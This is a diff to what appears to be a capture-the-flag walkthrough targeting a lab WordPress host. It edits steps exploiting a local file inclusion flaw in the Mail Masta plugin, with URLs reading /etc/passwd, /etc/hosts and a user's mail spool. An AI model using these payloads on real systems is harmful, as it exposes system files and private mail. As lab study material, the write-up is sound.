@@ -164,11 +164,16 @@ searchsploit mail masta
 ```bash
 searchxploit -x php/webapps/40290.txt
 ```
-http://192.168.1.206/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 ![image](https://github.com/user-attachments/assets/614a157b-3fc7-425c-b946-c2e652ea5cc9)
-http://192.168.1.206/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/hosts
+http://192.168.1.206/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 ![image](https://github.com/user-attachments/assets/f75129aa-8b8f-45ca-ab56-bffd87eea826)
 
+#### **as we found a plugin on mails, let's search for e-mails**
+```WEB
+http://192.168.1.206/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
+```
+![image](https://github.com/user-attachments/assets/84b33dfc-d780-4c30-8a82-75c6e1dcadbc)
+![image](https://github.com/user-attachments/assets/bdd37c8d-0aa0-4f20-ab91-0d646b1a980d)
 
 
 
